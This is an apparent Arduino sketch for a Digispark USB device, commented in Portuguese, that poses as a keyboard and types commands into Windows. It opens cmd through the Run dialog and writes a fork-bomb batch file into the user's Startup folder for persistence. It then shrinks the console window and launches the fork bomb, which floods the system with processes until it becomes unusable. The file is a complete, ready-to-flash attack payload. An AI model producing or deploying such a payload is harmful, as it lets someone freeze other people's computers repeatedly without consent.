#include "DigiKeyboardPtBr.h"
void setup() {  
  pinMode(0,OUTPUT); 
  pinMode(1,OUTPUT);     
}

void loop() {  
    pisca_led(100);
    DigiKeyboardPtBr.sendKeyStroke(0);
    DigiKeyboardPtBr.delay(500);
    DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboardPtBr.delay(500);
    DigiKeyboardPtBr.print("cmd");
    DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardPtBr.delay(500);
    DigiKeyboardPtBr.print(F("echo for /l %%x in (0, 0, 0) do start > \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fork.bat\""));
    DigiKeyboardPtBr.delay(500);
    DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardPtBr.delay(500);
    DigiKeyboardPtBr.print("MODE CON: COLS=15 LINES=1");
    DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardPtBr.delay(100);
    DigiKeyboardPtBr.print("COLOR EF");
    DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardPtBr.delay(500);
    DigiKeyboardPtBr.print(F("for /l %x in (0,0,0) do start"));
    DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER); 
    pisca_led(1000); 
    for(;;){ /*empty*/ }    
}

void pisca_led(int velocidade){  
  for (int inicio =1; inicio <= 10; inicio ++) {
    digitalWrite(0, HIGH); 
    digitalWrite(1, HIGH); 
    DigiKeyboardPtBr.delay(velocidade);  
    digitalWrite(0, LOW); 
    digitalWrite(1, LOW); 
    DigiKeyboardPtBr.delay(velocidade);  
  } 
}